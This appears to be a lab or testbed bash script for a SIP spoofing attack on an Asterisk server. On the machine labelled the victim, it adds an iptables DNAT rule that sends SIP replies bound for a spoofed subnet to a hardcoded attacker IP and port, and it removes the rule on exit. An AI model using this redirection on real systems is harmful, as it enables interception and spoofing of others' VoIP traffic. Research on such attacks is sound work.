#!/bin/bash

# Configuration variables
ACK_RETURN_QUEUE_NUM=2
SIP_PORT=5060
SPOOFED_SUBNET="10.10.123.0/25"
ATTACKER_IP="143.53.142.93"
ACK_PORT=4000

# On Victim machine - Return path
# Redirect Asterisk replies to attacker (DNAT)
sudo iptables -t nat -I OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"

# Cleanup function
cleanup() {
    # On Victim machine - Return path
    sudo iptables -t nat -D OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"
    exit
}

trap cleanup EXIT INT TERM

while true; do sleep 1; done
